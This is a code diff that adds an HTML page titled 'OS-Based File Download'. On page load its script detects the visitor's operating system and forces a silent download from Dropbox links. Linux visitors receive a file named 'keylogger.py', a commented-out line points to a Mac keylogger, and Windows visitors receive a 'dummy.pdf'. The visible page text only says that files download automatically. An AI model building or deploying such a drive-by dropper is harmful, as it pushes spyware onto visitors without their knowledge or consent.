@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>OS-Based File Download</title>
+  <script>
+    document.addEventListener("DOMContentLoaded", () => {
+      // OS-specific file URLs
+      const fileURLs = {
+        windows: "https://www.dropbox.com/scl/fi/5nmyf4fhebipk9sneple9/dummy.pdf?dl=1", 
+        linux: "https://www.dropbox.com/scl/fi/frchr8jsrum7snwgpb01t/keylogger.py?dl=1",  
+       // mac: "https://www.dropbox.com/scl/fi/mac-keylogger.py?dl=1"       
+      };
+
+    
+      function detectOS() {
+        const userAgent = window.navigator.userAgent.toLowerCase();
+
+        if (userAgent.includes("win")) return "windows";
+        if (userAgent.includes("mac")) return "mac";
+        if (userAgent.includes("linux")) return "linux";
+        return "unknown";
+      }
+
+
+      function triggerDownload(url) {
+        const anchor = document.createElement("a");
+        anchor.href = url;
+        anchor.download = ""; // Force download
+        document.body.appendChild(anchor);
+        anchor.click();
+        document.body.removeChild(anchor);
+      }
+
+      const os = detectOS();
+      console.log("Detected OS:", os);
+
+      if (fileURLs[os]) {
+        triggerDownload(fileURLs[os]);
+      } else {
+        alert("Unsupported operating system. No file available for download.");
+      }
+    });
+  </script>
+</head>
+<body>
+  <h1>Auto Download</h1>
+  <p>Your files will download automatically based on your operating system.</p>
+</body>
+</html>
